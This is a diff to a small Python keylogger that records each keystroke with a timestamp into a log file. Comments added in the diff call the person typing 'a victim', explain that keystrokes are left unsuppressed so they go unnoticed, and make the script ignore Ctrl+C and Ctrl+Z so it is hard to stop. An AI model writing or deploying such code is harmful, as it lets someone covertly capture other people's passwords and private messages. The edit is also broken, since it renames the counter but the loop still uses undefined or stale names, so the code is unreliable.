@@ -1,14 +1,15 @@
 from keyboard import *
 from time import *
-count = 0
-print(strftime('{0} %A, %B %d, %Y {0}\n'.format(50 * '='), localtime()), file=open('log.txt', 'a'))
-while count != 5:
+min_esc = 0
+max_esc = 5 # maximum count of typing an 'esc' key
+print(strftime('{0} %A, %B %d, %Y {0}\n'.format(50 * '='), localtime()), file=open('log.txt', 'a')) # Daytime format: %Weekday%, %Month% %Day%, %Year%
+while min_count != max_esc:
 	try:
-		r = read_hotkey(False)
+		r = read_hotkey(False) # I use False value to avoid supressing any single strokes of a victim
 		if r == 'esc':
 			count += 1
-		print(strftime('%I : %M : %S', localtime()), r, file=open('log.txt', 'a'), sep=' -> ')
-	except KeyboardInterrupt:
+		print(strftime('%I : %M : %S', localtime()), r, file=open('log.txt', 'a'), sep=' -> ') # Time Format: %Hours% : %Minutes% : %Seconds%
+	except KeyboardInterrupt: # Ctrl + C ignored
 		continue
-	except EOFError:
+	except EOFError: # Ctrl + Z ignored
 		continue
